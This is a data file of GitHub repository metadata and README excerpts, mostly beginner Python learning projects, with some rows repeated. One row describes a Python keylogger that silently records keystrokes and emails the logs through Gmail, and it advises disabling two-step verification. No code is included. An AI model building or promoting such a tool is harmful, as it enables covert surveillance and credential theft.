417674606;Python_Learning;https://github.com/fuzzy-egg8365/Python_Learning;;2021-10-16T00:37:20Z;0;0;0;Python_Learning Python Bible Learning This is a Git for my Python Course.  Nothing planned yet.  Just learning the ropes. 
417748756;python_lessons;https://github.com/uraimov92cnu/python_lessons;Python;2021-10-16T07:07:18Z;0;0;0;python_lessons python beginner lessons My beginner lessons in Python 
417711549;python-stapsdt;https://github.com/linux-usdt/python-stapsdt;Python;2021-10-16T04:08:10Z;1;1;1;"python-stapsdt Create USDT probes and instrument your Python application dynamically. Dependencies At the moment this package only runs on Linux and requires libstapsdt to be installed to create runtime probes. Ubuntu 16.04 To install libstapsdt, run: sudo add-apt-repository ppa:sthima/oss sudo apt-get update sudo apt-get install libstapsdt0 libstapsdt-dev Other Build from libstapsdt. Install pip install stapsdt Example The following code will create a probe named firstProbe. from time import sleep  import stapsdt  provider = stapsdt.Provider(""pythonapp"") probe = provider.add_probe(     ""firstProbe"", stapsdt.ArgTypes.uint64, stapsdt.ArgTypes.int32) provider.load()   while True:     print(""Firing probe..."")     if probe.fire(""My little probe"", 42):         print(""Probe fired!"")     sleep(1) You can then trace this probe with any tool able to trace Systemtap's probes. Here's an example with eBPF/bcc: sudo trace -p PID 'u::firstProbe ""%s - %d"", arg1, arg2' "
417730740;python_example;https://github.com/sandaruanjana/python_example;Python;2021-10-16T05:44:42Z;0;0;0;
417730271;Python-Tutorial;https://github.com/FRSummit2/Python-Tutorial;Python;2021-10-16T05:42:01Z;0;0;0;
417681610;Testes_Python;https://github.com/Sbdoe-Dev/Testes_Python;;2021-10-16T01:21:20Z;0;0;0;
417679574;python-exercicios;https://github.com/daphi-ny/python-exercicios;Python;2021-10-16T01:08:08Z;0;0;0;python exercicios que realizei durante o meu aprendizado de python. 
417713137;python-projects;https://github.com/jhuynh176/python-projects;Python;2021-10-16T04:16:23Z;0;0;0;My Python Projects Link to Programs  Fortune Ball Simple Shipper Comparison  Introduction:  This is the repository to store my Python projects based on my growing skills.  Description:  These projects will be created along my learning path. As I become more skilled in Python, the more complicated and more useful project will be created.  
417737033;PYTHON_Game;https://github.com/DeepR19/PYTHON_Game;Python;2021-10-16T06:15:54Z;0;0;0;
417715397;python_azur;https://github.com/aivoarm/python_azur;;2021-10-16T04:29:26Z;0;0;0;python_azur 
417687975;Python-Module;https://github.com/ZachRochette/Python-Module;Python;2021-10-16T02:00:37Z;0;0;0;Overview The point of this project is to practice the Python language. To further my skills with Python I will be creating a tic-tac-toe game where you will play against an AI. My purpose for writing this software is so that I can further my knowledge with the Python coding language. I will need to push myself in order to complete this assignment, and hopefully will have created something fun to use by the end of it. Software Demo Video Development Environment  Visual Studio Code Python 3.9.7 Import Random  Useful Websites {Make a list of websites that you found helpful in this project}  W3schools Tutorials Point Wiki How Geekflare AskPython Stack Overflow  Future Work  Add graphics to the game using something like Pygame Include the option to either play against the computer or against another person Make the game playable online  
417687646;RelearningPython;https://github.com/aiden-janey/RelearningPython;Python;2021-10-16T01:58:36Z;0;0;0;
417741131;public_python;https://github.com/MaxR-DakDak/public_python;Python;2021-10-16T06:34:43Z;0;0;0;
417725176;python-server;https://github.com/EugeneTerry/python-server;Python;2021-10-16T05:17:42Z;0;0;0;
417742856;Python-Projects;https://github.com/Divyasmitaswain/Python-Projects;Jupyter Notebook;2021-10-16T06:42:24Z;0;0;0;
417686014;Ejercicios-Python;https://github.com/emorales15b/Ejercicios-Python;Python;2021-10-16T01:48:59Z;0;0;0;
417716741;python-fundamental;https://github.com/asgart9/python-fundamental;Python;2021-10-16T04:35:32Z;0;0;0;python-fundamental It Works! 
417718152;LearnPython;https://github.com/antonprafanto/LearnPython;;2021-10-16T04:42:30Z;0;0;0;
417691542;Python-OOP;https://github.com/SuhasKamble/Python-OOP;Python;2021-10-16T02:21:00Z;0;0;0;
417706265;python-tutorial;https://github.com/welcomesoftware/python-tutorial;Python;2021-10-16T03:41:45Z;0;0;0;Tutorial de Python 
417677587;IntermediatePython;https://github.com/Xmexy/IntermediatePython;Python;2021-10-16T00:56:35Z;0;0;0;IntermediatePython 
417701422;Python-Team;https://github.com/Poo-python-team/Python-Team;;2021-10-16T03:13:39Z;0;0;0;Python-Team 
417728745;python-algorithm;https://github.com/Codejune/python-algorithm;Python;2021-10-16T05:34:36Z;0;0;0;
417758505;pg-python;https://github.com/c823969351/pg-python;;2021-10-16T07:53:17Z;0;0;0;pg-python 
417671271;python-01;https://github.com/jbcoliveira/python-01;Python;2021-10-16T00:14:28Z;0;0;0;python-01 
417699503;python_misc;https://github.com/pabloandura/python_misc;Jupyter Notebook;2021-10-16T03:03:06Z;0;0;0;Colecciono codigos de python mientras aprendo. 
417712028;AprendendoPython;https://github.com/Negrair/AprendendoPython;;2021-10-16T04:10:51Z;0;0;0;
417710708;Python_Learning;https://github.com/Cyber-Tech2077/Python_Learning;Python;2021-10-16T04:04:00Z;0;0;0;
417727515;python_project;https://github.com/ishanhimalka/python_project;;2021-10-16T05:29:54Z;0;0;0;python_project 
417734911;python-program;https://github.com/Hariomgupt/python-program;;2021-10-16T06:06:35Z;0;0;0;
417693826;Python-test;https://github.com/Poo-python-team/Python-test;;2021-10-16T02:33:12Z;0;0;0;Python-test 
417746990;python-workbook;https://github.com/euni-brownie/python-workbook;Python;2021-10-16T07:00:24Z;0;0;0;
417700103;python_practice;https://github.com/ak14bbk30/python_practice;;2021-10-16T03:06:33Z;0;0;0;
417735588;pythons-art;https://github.com/Revathymsony/pythons-art;;2021-10-16T06:09:18Z;0;0;0;
417745692;First-Python;https://github.com/hong7752/First-Python;Python;2021-10-16T06:54:44Z;0;0;0;
417678839;learn-python;https://github.com/marckomatic/learn-python;Python;2021-10-16T01:03:27Z;0;0;0;
417677552;Python-Projects;https://github.com/ShinHyoHaeng/Python-Projects;Jupyter Notebook;2021-10-16T00:56:22Z;0;0;0;
417700103;python_practice;https://github.com/ak14bbk30/python_practice;;2021-10-16T03:06:33Z;0;0;0;
417731439;Python_example;https://github.com/Udara-Deshan/Python_example;;2021-10-16T05:47:34Z;0;0;0;Python_example 
417751861;Code-python;https://github.com/xuankien547/Code-python;Python;2021-10-16T07:21:12Z;0;0;0;
417687518;Python_Projects;https://github.com/rachaelcole/Python_Projects;Python;2021-10-16T01:57:50Z;0;0;0;Python_Projects Personal projects built using Python 3.10. Including:  exercises from A Byte Of Python projects from Free Code Camp Kylie Ying youtube tutorials exercises from Coder's Apprentice  
417727515;python_project;https://github.com/ishanhimalka/python_project;;2021-10-16T05:29:54Z;0;0;0;python_project 
417734911;python-program;https://github.com/Hariomgupt/python-program;;2021-10-16T06:06:35Z;0;0;0;
417758505;pg-python;https://github.com/c823969351/pg-python;;2021-10-16T07:53:17Z;0;0;0;pg-python 
417728745;python-algorithm;https://github.com/Codejune/python-algorithm;Python;2021-10-16T05:34:36Z;0;0;0;
417701422;Python-Team;https://github.com/Poo-python-team/Python-Team;;2021-10-16T03:13:39Z;0;0;0;Python-Team 
417744741;python_basic;https://github.com/Scriptinfano/python_basic;Python;2021-10-16T06:50:41Z;0;0;0;
417749018;Python_newbie;https://github.com/bomby747/Python_newbie;;2021-10-16T07:08:22Z;0;0;0;
417747690;Python-Oops;https://github.com/BibhabenduMukherjee/Python-Oops;Python;2021-10-16T07:03:03Z;0;0;0;
417682312;python_html;https://github.com/jianglingwei1428/python_html;Python;2021-10-16T01:25:32Z;0;0;0;
417704178;Team-Python;https://github.com/pmNiko/Team-Python;;2021-10-16T03:29:08Z;0;0;0;Team-Python 
417759393;python-review;https://github.com/giorgiozoppi/python-review;Python;2021-10-16T07:57:29Z;0;0;0;
417752371;python_pr;https://github.com/Bhargavch5/python_pr;Python;2021-10-16T07:23:22Z;0;0;0;
417677267;Python-Utils;https://github.com/iarp/Python-Utils;Python;2021-10-16T00:54:44Z;0;0;0;IARP Python Utilities A collection of utilities I use a lot throughout many projects. I only work with Python 3.6 and 3.7 currently, as such these may not work in previous versions. Most notably due to f-strings.  Installation  pip install -e git+https://github.com/iarp/Python-Utils.git#egg=iarp_utils  Documentation Every file and function is commented about what it does, how and when to use it along with examples. Have a question? Open an issue. 
417684346;Python-Projects;https://github.com/umabollikonda/Python-Projects;;2021-10-16T01:38:30Z;0;0;0;Python-Projects 
417707479;BOJ-python;https://github.com/joo-prog/BOJ-python;Python;2021-10-16T03:48:11Z;0;0;0;BOJ-python Baekjoon onlinejudge (Python) 
417676773;python_revendo;https://github.com/luiztoledosilva/python_revendo;;2021-10-16T00:51:31Z;0;0;0;
417671271;python-01;https://github.com/jbcoliveira/python-01;Python;2021-10-16T00:14:28Z;0;0;0;python-01 
417699503;python_misc;https://github.com/pabloandura/python_misc;Jupyter Notebook;2021-10-16T03:03:06Z;0;0;0;Colecciono codigos de python mientras aprendo. 
417710708;Python_Learning;https://github.com/Cyber-Tech2077/Python_Learning;Python;2021-10-16T04:04:00Z;0;0;0;
417712028;AprendendoPython;https://github.com/Negrair/AprendendoPython;;2021-10-16T04:10:51Z;0;0;0;
417672375;Python_Certification_Course_1;https://github.com/codyallenutah/Python_Certification_Course_1;;2021-10-16T00:22:09Z;0;0;0;
417677023;python_regular_expressions;https://github.com/saveResources-searchSpace/python_regular_expressions;;2021-10-16T00:53:10Z;0;0;0;python_regular_expressions Python Regular Expressions Tutorials 
417688154;VELOCIraptor_Python_callftns;https://github.com/JinsuRhee/VELOCIraptor_Python_callftns;;2021-10-16T02:01:22Z;0;0;0;
417699540;DataMaxPayroll-Python;https://github.com/cdieckhoff/DataMaxPayroll-Python;Python;2021-10-16T03:03:19Z;0;0;0;DataMaxPayroll-Python An update written in Python of coursework I did in college. 
417722232;python-random-quote;https://github.com/OkayKul/python-random-quote;Python;2021-10-16T05:03:54Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417751627;even-numbers-in-Python;https://github.com/lazizbekravshanov/even-numbers-in-Python;Python;2021-10-16T07:20:18Z;0;0;0;
417679288;docker-python-test;https://github.com/khalludi/docker-python-test;Makefile;2021-10-16T01:06:10Z;0;0;0;docker-python-test This repo tests out a root level Makefile that runs the Makefiles in the children directories. To make the image: make build To run the image: make run To run all tests locally: make test 
417685750;Python-Flask-Api-Tutorial;https://github.com/FiorellaCrocco/Python-Flask-Api-Tutorial;Python;2021-10-16T01:47:13Z;0;0;0;"Todo List API in Python Flask  This is an interactive tutorial that will teach you how to create an API using the Python Flask framework using Python and Pipenv. 🌱  How to start this project This project comes with the necessary files to start working, but you have two options to start: a) Open this link in your browser to clone it with gitpod: https://gitpod.io#https://github.com/breatheco-de/python-flask-api-tutorial b) You can clone this repository on your local computer: $ git clone https://github.com/breatheco-de/python-flask-api-tutorial 💡 Important: Remember to create a new repository, update the remote (git remote set-url origin <your new url>), and upload the code to your new repository using add, commit and push. About the project we are going to build In this tutorial we are going to be building a REST API that exposes 3 endpoints to the internet: GET /todos POST /todos DELETE /todos/<int:position>  GET /todos Will return the list of all todos like this: [     {         ""done"": true,         ""label"": ""Sample Todo 1""     },     {         ""done"": true,         ""label"": ""Sample Todo 2""     } ] POST /todos It's going to add a new todo to the list, it will receive the following request body: {     ""done"": true,     ""label"": ""Sample Todo 1"" } And return the updated list of todos DELETE /todos/int:position It's going to remove one todo based on a given position at the end of the url, and return the updated list of todos. "
417699421;Python_Fraction_Class;https://github.com/2cansam/Python_Fraction_Class;Python;2021-10-16T03:02:36Z;0;0;0;
417721839;Python-Connect-4;https://github.com/mvn-rvn/Python-Connect-4;Python;2021-10-16T05:02:04Z;1;1;0;Python-Connect-4 
417690674;CursoPython1;https://github.com/Anezeres/CursoPython1;Python;2021-10-16T02:16:48Z;0;0;0;
417680560;mvc_by_python;https://github.com/leandromaia/mvc_by_python;Python;2021-10-16T01:14:42Z;0;0;0;MVC in Python 
417672839;simple-python-app;https://github.com/dewan-ahmed/simple-python-app;Python;2021-10-16T00:25:45Z;0;0;0;
417672968;python_chat_sockets;https://github.com/lor-man/python_chat_sockets;Python;2021-10-16T00:26:50Z;0;0;0;
417683555;RPG-Inventory-Python-Version-;https://github.com/humzahmalik07/RPG-Inventory-Python-Version-;Python;2021-10-16T01:33:21Z;0;0;0;Course: CS 30 Period: 2 Date created: 19/07/21 Date last modified: 21/07/21 Name: Humzah Zahid Malik Description: Batman x Green Lantern - Temple Escape 
417700664;Python-all-Projects;https://github.com/bahauddin23/Python-all-Projects;Python;2021-10-16T03:09:33Z;0;0;0;
417735221;Resume-Screening-with-Python;https://github.com/kumardubeynirmal3/Resume-Screening-with-Python;Jupyter Notebook;2021-10-16T06:07:48Z;0;0;0;Resume-Screening-with-Python 
417725403;python-tdd-book;https://github.com/vitalib-freeman/python-tdd-book;JavaScript;2021-10-16T05:18:44Z;0;0;0;
417746509;python-random-quote;https://github.com/digitalep0ch/python-random-quote;Python;2021-10-16T06:58:21Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417731854;python-assignment-3;https://github.com/charithakishan/python-assignment-3;Python;2021-10-16T05:49:47Z;0;0;0;python-assignment-3 
417724280;Python_Classwork_ATLAS_Five;https://github.com/vivaanbhandari/Python_Classwork_ATLAS_Five;Jupyter Notebook;2021-10-16T05:13:27Z;0;0;0;Name: Vivaan Bhandari Division: B Roll No: 44 Subject: Essentials of Computing & Coding Date: 14th October 2021 Python_Classwork_ATLAS_Five This repo contains the Jupyter Notebooks I completed in lecture nine and ten. 
417714745;basics_of_python_programming;https://github.com/trufkin/basics_of_python_programming;;2021-10-16T04:26:09Z;0;0;0;basics_of_python_programming https://stepik.org/course/67/syllabus 
417698691;Breezometer-Python-Library;https://github.com/ZacTyAdams/Breezometer-Python-Library;Python;2021-10-16T02:59:06Z;0;0;0;This is an unofficial library for the Breezometer API primarily for use by the Breezometer Home Assistant integration. 
417706366;Send_Email_Automation_PYTHON;https://github.com/NICOLASTHEO/Send_Email_Automation_PYTHON;Python;2021-10-16T03:42:23Z;0;0;0;
417709368;intermediate-python-course;https://github.com/khleo81/intermediate-python-course;Python;2021-10-16T03:57:53Z;0;0;0;Intermediate Python Course Hey there, In this course you will create a dice-rolling program using python. The code you create will be stored in the dice-roller.py file. This repo also contains course materials under the issues tab. 
417703590;Prueba-Zinobe-Backend-Python;https://github.com/daustariz18/Prueba-Zinobe-Backend-Python;;2021-10-16T03:25:40Z;0;0;0;Prueba-Zinobe-Backend-Python Prueba Para el Cargo de Desarrollador Backend  
417733418;Simple-Translater-with-python;https://github.com/RitikPal18/Simple-Translater-with-python;;2021-10-16T05:59:46Z;0;0;0;Simple-Translater-with-python This is a simple gui language translator created using python 
417746570;image-manipulation-python;https://github.com/ditodmm/image-manipulation-python;Python;2021-10-16T06:58:38Z;0;0;0;image-manipulation-python 
417757549;python-ci-test;https://github.com/junhtr/python-ci-test;Python;2021-10-16T07:48:14Z;0;0;0;python-ci-test 
417674035;python-homework1;https://github.com/juliannehiew/python-homework1;;2021-10-16T00:33:35Z;0;0;0;python-homework1 
417679430;Small-Python-Projects;https://github.com/vlganesh07/Small-Python-Projects;;2021-10-16T01:07:12Z;0;0;0;"The Practice programs are from the book ""The big book of small python projects"" "
417727395;Selenium-Basic-Python;https://github.com/MdNazmul9/Selenium-Basic-Python;HTML;2021-10-16T05:29:26Z;0;0;0;Selenium-Basic 
417726879;python.django-recipes-API;https://github.com/mateusfmfm/python.django-recipes-API;Python;2021-10-16T05:26:50Z;0;0;0;python.django-recipes-API 
417722617;CellConstruct-python;https://github.com/2017171222LZW/CellConstruct-python;;2021-10-16T05:05:34Z;0;0;0;CellConstruct-python image classfication models 
417738074;python-code-2;https://github.com/sahilkangane/python-code-2;;2021-10-16T06:20:41Z;0;0;0;
417682988;Math-with-python-code;https://github.com/codingstair/Math-with-python-code;Python;2021-10-16T01:30:03Z;0;0;0;
417694448;Graficacion-CodigoPython;https://github.com/IsaiSalazar/Graficacion-CodigoPython;Java;2021-10-16T02:36:50Z;0;0;0;
417703225;Hackerrank-python-solutions;https://github.com/spoo-rthi/Hackerrank-python-solutions;Python;2021-10-16T03:23:49Z;0;0;0;This repo contains solutions for Hackerrank python problems 
417714561;Python-KeyLogger;https://github.com/NAVI1237/Python-KeyLogger;Python;2021-10-16T04:25:09Z;0;0;0;KeyLogger Un simple KeyLogger que soporta el envio de registros por gmail o puede guardarlos localmente =] El script escucha las pulsaciones de teclas en segundo plano, cada cierto intervalo los guarda en un archivo de texto o puede enviar el registro por email Requisitos Instalar el modulo keyboard Enviar keylog por gmail  Cambiar los parametro de la linea 7 y 8 (ingresar datos validos) Activar el Acceso a aplicaciones menos seguras en la configuracion de la cuenta de Google (debido a que inicia sesion usando smtplib) Desactivar la autenticacion en dos pasos  
417735027;Python_space_invader;https://github.com/DeepR19/Python_space_invader;Python;2021-10-16T06:07:00Z;0;0;0;
417677890;recommender-system-python;https://github.com/RekaCodes/recommender-system-python;Jupyter Notebook;2021-10-16T00:58:34Z;0;0;0;Get Rec'd Building a recommendation system in python using the MovieLens dataset. 
417757897;PYTHON-WORKSHEET-1;https://github.com/ankit31691996/PYTHON-WORKSHEET-1;Jupyter Notebook;2021-10-16T07:50:06Z;0;0;0;PYTHON-WORKSHEET-1 flip robo internship 
417758399;Algorithm-Report-of-Python;https://github.com/JONWON2/Algorithm-Report-of-Python;Jupyter Notebook;2021-10-16T07:52:45Z;0;0;0;
417727352;IJSE_PYTHON_ASSINGMENT_1;https://github.com/ClassExamples/IJSE_PYTHON_ASSINGMENT_1;Python;2021-10-16T05:29:18Z;0;0;1;
417671750;endlesstrax-python-start-project;https://github.com/EndlessTrax/endlesstrax-python-start-project;;2021-10-16T00:17:27Z;0;0;0;
417754308;python_lesson5;https://github.com/begimain/python_lesson5;Python;2021-10-16T07:32:23Z;0;0;0;
417677405;alura-python-collections-1;https://github.com/cglima/alura-python-collections-1;Jupyter Notebook;2021-10-16T00:55:30Z;0;0;0;
417708813;OpenCV-python;https://github.com/enzzo19/OpenCV-python;Python;2021-10-16T03:55:00Z;0;0;0;
417704201;python_if-else;https://github.com/RomanFigurado/python_if-else;Python;2021-10-16T03:29:18Z;0;0;0;"a = 33 b = 200 if b > a: print(""b is greater than a"") a = 33 b = 200 if b > a: print(""b is greater than a"") a = 33 b = 33 if b > a:   print(""b is greater than a"") elif a == b:   print(""a and b are equal"")    a = 200   b = 33   if b > a:     print(""b is greater than a"")   elif a == b:     print(""a and b are equal"")   else:     print(""a is greater than b"")     print(""===================="")     a = 330     b = 330     print(""oh no"")  print(""++++++++++++++++++++++++++++++++++++++++++++++++++++"") a = 330 b = 330 print(""A"") if a > b else print(""="") if a == b else print(""B"") print(""////////////////////////////////////////////////////////"") a = 200 b = 33 c = 500 if a > b and c > a: print(""Both conditions are True"") print(""================================================="") a = 200 b = 33 c = 500 if a > b or a > c: print(""At least one of the conditions is True"") print(""+++++++++++++++++++++++++++++"") x = 18 if x > 10: print(""Above ten,"") if x > 20: print(""and also above 20!"") else: print(""but not above 20."")     print(""@@@@@@@@@@@@@@@@@@@@@@@@"")  "
417700678;pensePython2e;https://github.com/mathuesalexandre/pensePython2e;Python;2021-10-16T03:09:37Z;0;0;0;
417696491;tic-tac-toe-python;https://github.com/cdieckhoff/tic-tac-toe-python;Python;2021-10-16T02:47:09Z;0;0;0;tic-tac-toe-python An implementation of tic-tac-toe written in Python 
417736881;Python-For-Data-Analysis;https://github.com/Shubham-Das-Coder/Python-For-Data-Analysis;Jupyter Notebook;2021-10-16T06:15:24Z;0;0;0;Python-For-Data-Analysis 
417705162;Voltorb-Flip-in-Python;https://github.com/AfterthoughtC/Voltorb-Flip-in-Python;Python;2021-10-16T03:35:07Z;0;0;0;Voltorb-Flip-in-Python Voltorb Flip game made in PyQt5. 
417727788;python-ds-practice;https://github.com/jessndots/python-ds-practice;Python;2021-10-16T05:30:54Z;0;0;0;
417732188;certificate-generator-python;https://github.com/Bharathvarma007/certificate-generator-python;Python;2021-10-16T05:51:47Z;0;0;0;
417750935;Data-Visualization-with-Python;https://github.com/Sibusiso123/Data-Visualization-with-Python;Jupyter Notebook;2021-10-16T07:17:14Z;0;0;0;Data-Visualization-with-Python Data visualization is the graphical representation of data in order to interactively and efficiently convey insights to clients, customers, and stakeholders in general. It is a way to summarize your findings and display it in a form that facilitates interpretation and can help in identifying patterns or trends. 
417751636;Access-Web-using-Python;https://github.com/kumawatrv/Access-Web-using-Python;Python;2021-10-16T07:20:19Z;0;0;1;Simple Web Browser to test GET Command of HTTP & Socket in Python. 
417737086;Python_basic_projects;https://github.com/j-anne/Python_basic_projects;Python;2021-10-16T06:16:10Z;0;0;0;
417734773;python-task-1;https://github.com/sahilkangane/python-task-1;;2021-10-16T06:05:59Z;0;0;0;
417726116;python-for-finance;https://github.com/GuoqingZhang99/python-for-finance;;2021-10-16T05:23:13Z;0;0;0;"python-for-finance Learn ""Python for finance"" by Yves Hilpisch "
417738328;mega-sdk-python;https://github.com/rootgamer9870-glitch/mega-sdk-python;Dockerfile;2021-10-16T06:21:44Z;0;0;0;Mega-Sdk-Python Docker Docker image for priiiiyo-mirrorbot Status    How to use? docker pull priiiiyo/mega-sdk-python:latest  OR docker pull ghcr.io/priiiiyo/mega-sdk-python:latest  Credits  Izzy12 for original source  
417745137;python-data-analysis;https://github.com/smallstone123/python-data-analysis;;2021-10-16T06:52:21Z;0;0;0;python-data-analysis the code and documemt 
417739924;alertmanager-webhook-pushsafer-python;https://github.com/wreiner/alertmanager-webhook-pushsafer-python;Python;2021-10-16T06:29:19Z;0;0;0;"Alertmanager webhook for Pushsafer (Python Version) A webhook for Prometheus' Alertmanager to push alerts to pushsafer written in Python. Alertmanager configuration example route:   group_by: ['alertname']   group_wait: 30s   group_interval: 5m   repeat_interval: 1h   receiver: 'pushsafer-webhook' receivers: - name: 'pushsafer-webhook'   webhook_configs:   - url: http://<host-or-ip>:9196/alert     send_resolved: true     http_config:       basic_auth:         username: 'user'         password: 'password' inhibit_rules:   - source_match:       severity: 'critical'     target_match:       severity: 'warning'     equal: ['alertname', 'dev', 'instance']   Running on docker docker run --name amwh \ 	-p 9196:9196 \ 	-v /etc/pushsafer_alertmanager_webhook.conf:/etc/pushsafer_alertmanager_webhook.conf \ 	wreiner/alertmanager-webhook-pushsafer  Development Install python3 -m venv env source env/bin/activate pip install -r requirements.txt  Run development source env/bin/activate python3 pushsafer_alertmanager_webhook.py  Example to test curl -XPOST --data '{""status"":""resolved"",""groupLabels"":{""alertname"":""instance_down""},""commonAnnotations"":{""description"":""i-0d7188fkl90bac100 of job ec2-sp-node_exporter has been down for more than 2 minutes."",""summary"":""Instance i-0d7188fkl90bac100 down""},""alerts"":[{""status"":""resolved"",""labels"":{""name"":""olokinho01-prod"",""instance"":""i-0d7188fkl90bac100"",""job"":""ec2-sp-node_exporter"",""alertname"":""instance_down"",""os"":""linux"",""severity"":""page""},""endsAt"":""2019-07-01T16:16:19.376244942-03:00"",""generatorURL"":""http://pmts.io:9090"",""startsAt"":""2019-07-01T16:02:19.376245319-03:00"",""annotations"":{""description"":""i-0d7188fkl90bac100 of job ec2-sp-node_exporter has been down for more than 2 minutes."",""summary"":""Instance i-0d7188fkl90bac100 down""}}],""version"":""4"",""receiver"":""infra-alert"",""externalURL"":""http://alm.io:9093"",""commonLabels"":{""name"":""olokinho01-prod"",""instance"":""i-0d7188fkl90bac100"",""job"":""ec2-sp-node_exporter"",""alertname"":""instance_down"",""os"":""linux"",""severity"":""page""}}' http://username:password@<host-or-ip>:9196/alert  Source  based upon nopp/alertmanager-webhook-telegram-python  "
417703803;python-mysql-sqalchemy;https://github.com/luisangelbm/python-mysql-sqalchemy;Python;2021-10-16T03:26:57Z;0;0;0;python-mysql-sqalchemy Creación de una API de tareas con Flask, sqlAlchemy(ORM) 
417751162;Python_Stock_Analysis;https://github.com/jungmin03/Python_Stock_Analysis;Python;2021-10-16T07:18:06Z;0;0;0;
417752927;Mini-python-projects;https://github.com/Vedant-code/Mini-python-projects;Python;2021-10-16T07:26:07Z;0;0;0;Mini-python-projects 
417738116;jump_to_python;https://github.com/unseodongtallulla/jump_to_python;Jupyter Notebook;2021-10-16T06:20:51Z;0;0;0;jump_to_python 나의 첫 코딩 저장소!! 
417670160;todoList_Python_Flask;https://github.com/JuanAntonaccio/todoList_Python_Flask;Python;2021-10-16T00:07:36Z;0;0;0;"Todo List API in Python Flask  This is an interactive tutorial that will teach you how to create an API using the Python Flask framework using Python and Pipenv. 🌱  How to start this project This project comes with the necessary files to start working, but you have two options to start: a) Open this link in your browser to clone it with gitpod: https://gitpod.io#https://github.com/breatheco-de/python-flask-api-tutorial b) You can clone this repository on your local computer: $ git clone https://github.com/breatheco-de/python-flask-api-tutorial 💡 Important: Remember to create a new repository, update the remote (git remote set-url origin <your new url>), and upload the code to your new repository using add, commit and push. About the project we are going to build In this tutorial we are going to be building a REST API that exposes 3 endpoints to the internet: GET /todos POST /todos DELETE /todos/<int:position>  GET /todos Will return the list of all todos like this: [     {         ""done"": true,         ""label"": ""Sample Todo 1""     },     {         ""done"": true,         ""label"": ""Sample Todo 2""     } ] POST /todos It's going to add a new todo to the list, it will receive the following request body: {     ""done"": true,     ""label"": ""Sample Todo 1"" } And return the updated list of todos DELETE /todos/int:position It's going to remove one todo based on a given position at the end of the url, and return the updated list of todos. "
417696074;CursoIntermedioPython;https://github.com/jeigar2/CursoIntermedioPython;Python;2021-10-16T02:45:14Z;0;0;0;CursoIntermedioPython Curso de Python: Comprehensions, Lambdas y Manejo de Errores Facundo García Martoni - Platzi 
417670712;python_crash_course;https://github.com/bigb0sss/python_crash_course;Python;2021-10-16T00:11:18Z;0;0;0;python_crash_course python learning 
417681303;2021-CMD-Python_Language;https://github.com/Team-CMD/2021-CMD-Python_Language;;2021-10-16T01:19:36Z;0;0;0;
417677003;python-template-default;https://github.com/pazfelipe/python-template-default;Python;2021-10-16T00:53:02Z;0;0;0;
417724110;selenium-python-learn;https://github.com/klinson/selenium-python-learn;;2021-10-16T05:12:45Z;0;0;0;selenium+python 学习笔记 
417745491;HelloWorld-in-Python;https://github.com/siraisi368/HelloWorld-in-Python;Python;2021-10-16T06:53:51Z;0;0;0;HelloWorld-in-Python Pythonにも触ってみたくなったので 
417732262;list_in_Python;https://github.com/nishikantgurav/list_in_Python;;2021-10-16T05:52:19Z;0;0;0;list_in_Python This is file contains all the functions related to  list 
417732400;Python-CursoEmVideo;https://github.com/EduardoArgenti/Python-CursoEmVideo;Python;2021-10-16T05:53:17Z;0;0;0;Python-CursoEmVideo Repositório com exercícios dos Módulos 1, 2 e 3 do curso de Python do Curso em Vídeo. 
417738768;naive-python-plugins;https://github.com/dcorderoch/naive-python-plugins;Python;2021-10-16T06:24:11Z;0;0;0;naive-python-plugins Small proof-of-concept for a system that allows installing plugins 
417718150;Sample-Program-Python;https://github.com/adi-chang/Sample-Program-Python;;2021-10-16T04:42:30Z;0;0;0;Sample-Program-Python Contoh Program yang ditulis dengan menggunakan bahasa pemrograman Python 
417683645;Chat-in-Python;https://github.com/ruiwenge2/Chat-in-Python;HTML;2021-10-16T01:33:56Z;1;1;0;Chat in Python A chat in Python using flask_socketio. 
417709148;DataStructuresPython;https://github.com/guvenbe/DataStructuresPython;Python;2021-10-16T03:56:40Z;0;0;0;
417747043;graphql-python-api;https://github.com/GruDev325/graphql-python-api;;2021-10-16T07:00:37Z;0;0;0;graphql-python-api 
417753251;python-project-lvl1;https://github.com/KVolDeMaR/python-project-lvl1;;2021-10-16T07:27:44Z;0;0;0;Hexlet tests and linter status:  
417755128;Nback_python_analysis;https://github.com/fujitamasayoshi0402/Nback_python_analysis;Python;2021-10-16T07:36:21Z;0;0;0;
417723592;python-pentesting-scripts;https://github.com/promptlycandid/python-pentesting-scripts;Python;2021-10-16T05:10:06Z;0;0;0;Pentesting_Scripts Pentesting Scripts 
417671665;egnyte-api-python-examples;https://github.com/noCR4SH/egnyte-api-python-examples;;2021-10-16T00:16:54Z;0;0;0;egnyte-api-python-examples Python examples for Egnyte Public API 
417727267;ASSIGNMENT-NO-03-PYTHON;https://github.com/RENUKAWANKHEDE/ASSIGNMENT-NO-03-PYTHON;;2021-10-16T05:28:57Z;0;0;0;
417731555;miniPythonProjects;https://github.com/sazzad-mahmud/miniPythonProjects;Python;2021-10-16T05:48:07Z;0;0;0;
417706428;DrawVirusWithPython;https://github.com/asimkilic/DrawVirusWithPython;Python;2021-10-16T03:42:47Z;0;0;0;Draw a Virus with Python  
417706114;python-gui-aktiva;https://github.com/ghifary07/python-gui-aktiva;Python;2021-10-16T03:40:49Z;0;0;0;python-gui-aktiva Program python GUI untuk menghitung depresiasi per periode dari suatu aktiva tetap 
